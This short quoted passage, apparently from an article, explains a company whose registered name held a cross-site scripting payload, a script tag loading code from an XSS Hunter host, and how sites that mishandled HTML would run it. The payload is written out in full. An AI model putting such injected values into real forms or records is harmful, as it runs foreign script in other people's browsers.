<blockquote>The original name of the company was &quot;&quot;&gt;&lt;SCRIPT SRC=HTTPS://MJT.XSS.HT&gt; LTD&quot;. By beginning the name with a quotation mark and chevron, any site which failed to properly handle the HTML code would have mistakenly thought the company name was blank, and then loaded and executed a script from the site XSS Hunter, which helps developers find cross-site scripting errors.</blockquote>
